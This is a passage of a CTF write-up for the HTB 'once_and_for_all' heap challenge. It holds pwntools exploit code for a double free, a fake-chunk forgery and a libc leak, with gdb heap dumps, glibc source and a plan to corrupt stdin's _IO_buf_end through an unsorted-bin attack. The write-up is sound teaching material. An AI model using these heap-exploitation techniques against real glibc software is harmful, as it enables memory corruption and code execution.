    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Choose an index: &#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;How much space do you need for it: &#34;</span>, str(size)<span style="color:#f92672">.</span>encode())
    <span style="color:#66d9ef">if</span> hang <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span>:
        <span style="color:#66d9ef">return</span>

    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input your weapon&#39;s details: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, data)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">freexalloc</span>(idx, size, data, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Choose an index: &#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;How much space do you need for this repair: &#34;</span>, str(size)<span style="color:#f92672">.</span>encode())

    <span style="color:#66d9ef">if</span> doubleFree:
        <span style="color:#66d9ef">return</span>

    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input your weapon&#39;s details: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, data)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(idx):
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Choose an index: &#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">allochuge</span>(size):
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;How much space do you need for this massive weapon: &#34;</span>, str(size)<span style="color:#f92672">.</span>encode())

<span style="color:#75715e"># get libc leak</span>

add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">56</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">55</span>)
add(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">56</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">39</span>)
add(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">40</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">39</span>) <span style="color:#75715e"># size</span>
add(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">56</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x10</span>))
add(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">40</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;E&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">39</span>)

add(<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">40</span>, pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x21</span>)) <span style="color:#75715e"># barrier</span>

<span style="color:#75715e"># freexalloc(5, 560, b&#34;&#34;, doubleFree=True)</span>

freexalloc(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
freexalloc(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
freexalloc(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)

freexalloc(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
add(<span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">56</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">56</span>  <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb1</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># fake unsorted chunk</span>

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">0x555555608560:	0x0000000000000000	0x0000000000000041 [0]
</span><span style="color:#e6db74">0x555555608570:	0x00005555556085a0	0x4141414141414141
</span><span style="color:#e6db74">0x555555608580:	0x4141414141414141	0x4141414141414141
</span><span style="color:#e6db74">0x555555608590:	0x4141414141414141	0x4141414141414141
</span><span style="color:#e6db74">0x5555556085a0:	0x0a41414141414141	0x0000000000000041 [1]
</span><span style="color:#e6db74">0x5555556085b0:	0x0000000000000000	0x0000000000000000
</span><span style="color:#e6db74">0x5555556085c0:	0x0000000000000000	0x0000000000000000
</span><span style="color:#e6db74">0x5555556085d0:	0x0000000000000000	0x0000000000000000
</span><span style="color:#e6db74">0x5555556085e0:	0x0000000000000000	0x00000000000000b1 [2] &lt;- Fake size | PREV_INUSE (1)
</span><span style="color:#e6db74">0x5555556085f0:	0x0000000000000000	0x4343434343434343	 
</span><span style="color:#e6db74">0x555555608600:	0x4343434343434343	0x4343434343434343	 
</span><span style="color:#e6db74">0x555555608610:	0x0a43434343434343	0x0000000000000041 [3]	 
</span><span style="color:#e6db74">0x555555608620:	0x4444444444444444	0x4444444444444444	 
</span><span style="color:#e6db74">0x555555608630:	0x000000000000000a	0x0000000000000000
</span><span style="color:#e6db74">0x555555608640:	0x0000000000000000	0x0000000000000000	 
</span><span style="color:#e6db74">0x555555608650:	0x0000000000000000	0x0000000000000031 [4]	 
</span><span style="color:#e6db74">0x555555608660:	0x4545454545454545	0x4545454545454545	 
</span><span style="color:#e6db74">0x555555608670:	0x4545454545454545	0x4545454545454545	 
</span><span style="color:#e6db74">0x555555608680:	0x0a45454545454545	0x0000000000000031 [10]	 
</span><span style="color:#e6db74">0x555555608690:	0x0000000000000000	0x0000000000000021 &lt;- Fake chunk header 
</span><span style="color:#e6db74">0x5555556086a0:	0x000000000000000a	0x0000000000000000
</span><span style="color:#e6db74">0x5555556086b0:	0x0000000000000000	0x0000000000020951 &lt;- Top chunk
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">fastbins
</span><span style="color:#e6db74">0x30: 0x5555556085e0 ◂— 0x0
</span><span style="color:#e6db74">0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

</code></pre></div><p>We allocate 6 chunks, we need 6 chunks because of the fake size we write on <code>chunk_2</code> (<code>&amp;chunk_2</code> + <code>0xb0</code> = <code>0x555555608690</code>, in the last chunk near the top chunk). In the same way we craft a fake header in the body of the last chunk to avoid issues during the release of <code>chunk_2</code>. If you&rsquo;re not familiar with the security checks done by <code>malloc</code> and <code>free</code>, I would advise you to take a look at <a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks">this ressource</a>.</p>
<p>Now that <code>chunk_2</code> has been tampered with a fake <code>0xb0</code> size, we just have to free it 8 times (to fill the tcache) to put it in the unsorted bin:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">freexalloc(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
freexalloc(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
freexalloc(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
freexalloc(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
freexalloc(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
freexalloc(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
freexalloc(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)

freexalloc(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
<span style="color:#75715e"># falls into the unsortedbin</span>

show(<span style="color:#ae81ff">2</span>)

libc <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>u64(io<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3ebca0</span> <span style="color:#75715e"># offset of the unsorted bin</span>

stdin <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3eba00</span>
pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc: </span><span style="color:#e6db74">{</span>hex(libc)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">0x555555608560:	0x0000000000000000	0x0000000000000041
</span><span style="color:#e6db74">0x555555608570:	0x00005555556085a0	0x4141414141414141
</span><span style="color:#e6db74">0x555555608580:	0x4141414141414141	0x4141414141414141
</span><span style="color:#e6db74">0x555555608590:	0x4141414141414141	0x4141414141414141
</span><span style="color:#e6db74">0x5555556085a0:	0x0a41414141414141	0x0000000000000041
</span><span style="color:#e6db74">0x5555556085b0:	0x0000000000000000	0x0000000000000000
</span><span style="color:#e6db74">0x5555556085c0:	0x0000000000000000	0x0000000000000000
</span><span style="color:#e6db74">0x5555556085d0:	0x0000000000000000	0x0000000000000000
</span><span style="color:#e6db74">0x5555556085e0:	0x0000000000000000	0x00000000000000b1
</span><span style="color:#e6db74">0x5555556085f0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
</span><span style="color:#e6db74">0x555555608600:	0x4343434343434343	0x4343434343434343
</span><span style="color:#e6db74">0x555555608610:	0x0a43434343434343	0x0000000000000041
</span><span style="color:#e6db74">0x555555608620:	0x4444444444444444	0x4444444444444444
</span><span style="color:#e6db74">0x555555608630:	0x000000000000000a	0x0000000000000000
</span><span style="color:#e6db74">0x555555608640:	0x0000000000000000	0x0000000000000000
</span><span style="color:#e6db74">0x555555608650:	0x0000000000000000	0x0000000000000031
</span><span style="color:#e6db74">0x555555608660:	0x4545454545454545	0x4545454545454545
</span><span style="color:#e6db74">0x555555608670:	0x4545454545454545	0x4545454545454545
</span><span style="color:#e6db74">0x555555608680:	0x0a45454545454545	0x0000000000000031
</span><span style="color:#e6db74">0x555555608690:	0x00000000000000b0	0x0000000000000020
</span><span style="color:#e6db74">0x5555556086a0:	0x000000000000000a	0x0000000000000000
</span><span style="color:#e6db74">0x5555556086b0:	0x0000000000000000	0x0000000000020951
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">unsortedbin
</span><span style="color:#e6db74">all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
</span><span style="color:#e6db74">tcachebins
</span><span style="color:#e6db74">0xb0 [  7]: 0x5555556085f0 —▸ 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556086b0 ◂— 0x0
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</code></pre></div><p>Which gives:</p>
<pre tabindex="0"><code>nasm@off:~/Documents/pwn/HTB/apocalypse/onceAndmore$ python3 exploit.py LOCAL GDB NOASLR
[*] '/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/out'
[!] Debugging process with ASLR disabled
[+] Starting local process '/usr/bin/gdbserver': pid 31378
[*] running in new terminal: ['/usr/bin/gdb', '-q', '/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all', '-x', '/tmp/pwn1z_5e0ie.gdb']
[*] libc: 0x7ffff79e4000
</code></pre><p>We now have achieved the first step of the challenge: leak the libc base address.</p>
<h2 id="what-can-we-target-in-the-libc-">What can we target in the libc ?</h2>
<p>There are a lot of ways to achieve code execution according to what I&rsquo;ve read in other write-ups, I choose to attack <code>_IO_stdin</code> by running an unsorted bin attack on its <code>_IO_buf_end</code> field which holds the end of the internal buffer of <code>stdin</code> from <code>_IO_buf_base</code>, according to the <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/fileops.c#L469">glibc source code</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span>
<span style="color:#a6e22e">_IO_new_file_underflow</span> (_IO_FILE <span style="color:#f92672">*</span>fp)
{
  _IO_ssize_t count;
<span style="color:#75715e">#if 0</span><span style="color:#75715e">
</span><span style="color:#75715e">  /* SysV does not make this test; take it out for compatibility */
</span><span style="color:#75715e">  if (fp-&gt;_flags &amp; _IO_EOF_SEEN)
</span><span style="color:#75715e">    return (EOF);
</span><span style="color:#75715e"></span><span style="color:#75715e">#endif
</span><span style="color:#75715e"></span>
  <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_NO_READS)
    {
      fp<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">|=</span> _IO_ERR_SEEN;
      __set_errno (EBADF);
      <span style="color:#66d9ef">return</span> EOF;
    }
  <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_IO_read_ptr <span style="color:#f92672">&lt;</span> fp<span style="color:#f92672">-&gt;</span>_IO_read_end)
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) fp<span style="color:#f92672">-&gt;</span>_IO_read_ptr;

  <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_IO_buf_base <span style="color:#f92672">==</span> NULL)
    {
      <span style="color:#75715e">/* Maybe we already have a push back pointer.  */</span>
      <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_IO_save_base <span style="color:#f92672">!=</span> NULL)
	{
	  free (fp<span style="color:#f92672">-&gt;</span>_IO_save_base);
	  fp<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;=</span> <span style="color:#f92672">~</span>_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);
    }

  <span style="color:#75715e">/* Flush all line buffered files before reading. */</span>
  <span style="color:#75715e">/* FIXME This can/should be moved to genops ?? */</span>
  <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> (_IO_LINE_BUF<span style="color:#f92672">|</span>_IO_UNBUFFERED))
    {
<span style="color:#75715e">#if 0</span><span style="color:#75715e">
</span><span style="color:#75715e">      _IO_flush_all_linebuffered ();
</span><span style="color:#75715e"></span><span style="color:#75715e">#else
</span><span style="color:#75715e"></span>      <span style="color:#75715e">/* We used to flush all line-buffered stream.  This really isn&#39;t
</span><span style="color:#75715e">	 required by any standard.  My recollection is that
</span><span style="color:#75715e">	 traditional Unix systems did this for stdout.  stderr better
</span><span style="color:#75715e">	 not be line buffered.  So we do just that here
</span><span style="color:#75715e">	 explicitly.  --drepper */</span>
      _IO_acquire_lock (_IO_stdout);

      <span style="color:#66d9ef">if</span> ((_IO_stdout<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> (_IO_LINKED <span style="color:#f92672">|</span> _IO_NO_WRITES <span style="color:#f92672">|</span> _IO_LINE_BUF))
	  <span style="color:#f92672">==</span> (_IO_LINKED <span style="color:#f92672">|</span> _IO_LINE_BUF))
	_IO_OVERFLOW (_IO_stdout, EOF);

      _IO_release_lock (_IO_stdout);
<span style="color:#75715e">#endif
</span><span style="color:#75715e"></span>    }

  _IO_switch_to_get_mode (fp);

  <span style="color:#75715e">/* This is very tricky. We have to adjust those
</span><span style="color:#75715e">     pointers before we call _IO_SYSREAD () since
</span><span style="color:#75715e">     we may longjump () out while waiting for
</span><span style="color:#75715e">     input. Those pointers may be screwed up. H.J. */</span>
  fp<span style="color:#f92672">-&gt;</span>_IO_read_base <span style="color:#f92672">=</span> fp<span style="color:#f92672">-&gt;</span>_IO_read_ptr <span style="color:#f92672">=</span> fp<span style="color:#f92672">-&gt;</span>_IO_buf_base;
  fp<span style="color:#f92672">-&gt;</span>_IO_read_end <span style="color:#f92672">=</span> fp<span style="color:#f92672">-&gt;</span>_IO_buf_base;
  fp<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">=</span> fp<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">=</span> fp<span style="color:#f92672">-&gt;</span>_IO_write_end
    <span style="color:#f92672">=</span> fp<span style="color:#f92672">-&gt;</span>_IO_buf_base;

  count <span style="color:#f92672">=</span> _IO_SYSREAD (fp, fp<span style="color:#f92672">-&gt;</span>_IO_buf_base,
		       fp<span style="color:#f92672">-&gt;</span>_IO_buf_end <span style="color:#f92672">-</span> fp<span style="color:#f92672">-&gt;</span>_IO_buf_base);
  <span style="color:#66d9ef">if</span> (count <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
    {
      <span style="color:#66d9ef">if</span> (count <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
	fp<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">|=</span> _IO_EOF_SEEN;
      <span style="color:#66d9ef">else</span>
	fp<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">|=</span> _IO_ERR_SEEN, count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  }
  fp<span style="color:#f92672">-&gt;</span>_IO_read_end <span style="color:#f92672">+=</span> count;
  <span style="color:#66d9ef">if</span> (count <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
    {
      <span style="color:#75715e">/* If a stream is read to EOF, the calling application may switch active
</span><span style="color:#75715e">	 handles.  As a result, our offset cache would no longer be valid, so
</span><span style="color:#75715e">	 unset it.  */</span>
      fp<span style="color:#f92672">-&gt;</span>_offset <span style="color:#f92672">=</span> _IO_pos_BAD;
      <span style="color:#66d9ef">return</span> EOF;
    }
  <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_offset <span style="color:#f92672">!=</span> _IO_pos_BAD)
    _IO_pos_adjust (fp<span style="color:#f92672">-&gt;</span>_offset, count);
  <span style="color:#66d9ef">return</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) fp<span style="color:#f92672">-&gt;</span>_IO_read_ptr;
}
</code></pre></div><p>The interesting part is the <code>count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code> which reads <code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code> bytes in <code>fp-&gt;_IO_buf_base</code>. Which means if <code>fp-&gt;_IO_buf_end</code> is replaced with the help of an unsorted bin attack by the address of the unsorted bin and that <code>&amp;unsorted bin &gt; fp-&gt;_IO_buf_base</code>, we can trigger an out of bound write from a certain address up to the address of the unsorted bin. We can inspect the layout in gdb to see what&rsquo;s actually going on:</p>
<pre tabindex="0"><code>pwndbg&gt; x/100gx stdin
0x7ffff7dcfa00 &lt;_IO_2_1_stdin_&gt;:	0x00000000fbad208b	0x00007ffff7dcfa83
0x7ffff7dcfa10 &lt;_IO_2_1_stdin_+16&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa20 &lt;_IO_2_1_stdin_+32&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa30 &lt;_IO_2_1_stdin_+48&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa40 &lt;_IO_2_1_stdin_+64&gt;:	0x00007ffff7dcfa84	0x0000000000000000
0x7ffff7dcfa50 &lt;_IO_2_1_stdin_+80&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfa60 &lt;_IO_2_1_stdin_+96&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfa70 &lt;_IO_2_1_stdin_+112&gt;:	0x0000001000000000	0xffffffffffffffff
0x7ffff7dcfa80 &lt;_IO_2_1_stdin_+128&gt;:	0x000000000a000000	0x00007ffff7dd18d0
0x7ffff7dcfa90 &lt;_IO_2_1_stdin_+144&gt;:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dcfaa0 &lt;_IO_2_1_stdin_+160&gt;:	0x00007ffff7dcfae0	0x0000000000000000
0x7ffff7dcfab0 &lt;_IO_2_1_stdin_+176&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfac0 &lt;_IO_2_1_stdin_+192&gt;:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dcfad0 &lt;_IO_2_1_stdin_+208&gt;:	0x0000000000000000	0x00007ffff7dcc2a0
0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfaf0 &lt;_IO_wide_data_0+16&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb00 &lt;_IO_wide_data_0+32&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb10 &lt;_IO_wide_data_0+48&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb20 &lt;_IO_wide_data_0+64&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb30 &lt;_IO_wide_data_0+80&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb40 &lt;_IO_wide_data_0+96&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb50 &lt;_IO_wide_data_0+112&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb60 &lt;_IO_wide_data_0+128&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb70 &lt;_IO_wide_data_0+144&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb80 &lt;_IO_wide_data_0+160&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb90 &lt;_IO_wide_data_0+176&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfba0 &lt;_IO_wide_data_0+192&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbb0 &lt;_IO_wide_data_0+208&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbc0 &lt;_IO_wide_data_0+224&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbd0 &lt;_IO_wide_data_0+240&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbe0 &lt;_IO_wide_data_0+256&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbf0 &lt;_IO_wide_data_0+272&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc00 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc10 &lt;_IO_wide_data_0+304&gt;:	0x00007ffff7dcbd60	0x0000000000000000
0x7ffff7dcfc20 &lt;__memalign_hook&gt;:	0x00007ffff7a7b410	0x00007ffff7a7c790
0x7ffff7dcfc30 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc40 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000001
0x7ffff7dcfc50 &lt;main_arena+16&gt;:	0x0000000000000000	0x00005555556085e0
0x7ffff7dcfc60 &lt;main_arena+32&gt;:	0x0000555555608560	0x0000000000000000
0x7ffff7dcfc70 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc80 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc90 &lt;main_arena+80&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfca0 &lt;main_arena+96&gt;:	0x00005555556086b0	&lt;- &amp;unsortedbin = 0x7ffff7dcfca0
pwndbg&gt; p *stdin
$1 = {
  _flags = -72540021,
  _IO_read_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_read_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_read_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_write_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_write_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_write_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_buf_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_buf_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x0,
  _fileno = 0,
  _flags2 = 16,
  _old_offset = -1,
  _cur_column = 0,
  _vtable_offset = 0 '\000',
  _shortbuf = &quot;\n&quot;,
  _lock = 0x7ffff7dd18d0 &lt;_IO_stdfile_0_lock&gt;,
  _offset = -1,
  _codecvt = 0x0,
  _wide_data = 0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0,
  _mode = -1,
  _unused2 = '\000' &lt;repeats 19 times&gt;
}
</code></pre><p>As you can see right above and according to the source code showed previously, <code>_IO_stdin-&gt;_IO_buf_base</code> points toward <code>_IO_stdin-&gt;_shortbuf</code>, an internal buffer directly in <code>stdin</code>. And <code>&amp;unsortedbin &gt; _IO_buf_base &gt; stdin</code>. If you do not fully understand my explanations, I advise you to take a look at <a href="https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/">this great article</a>.</p>
